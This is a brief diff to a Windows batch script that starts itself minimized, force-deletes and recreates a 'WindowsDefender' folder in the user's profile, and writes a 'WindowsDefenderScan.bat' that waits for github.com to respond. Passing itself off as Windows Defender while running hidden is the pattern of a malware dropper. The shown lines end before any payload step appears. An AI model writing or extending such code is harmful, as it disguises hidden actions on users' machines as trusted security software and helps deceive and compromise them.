@@ -1,6 +1,6 @@
 @echo off
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-rmdir "%userprofile%\WindowsDefender"
+rmdir /s /q "%userprofile%\WindowsDefender"
 md "%userprofile%\WindowsDefender"
 echo powershell -command "do {$ping = test-connection -comp github.com -count 1 -Quiet} until ($ping)" > "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo cd "%%userprofile%%\WindowsDefender" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
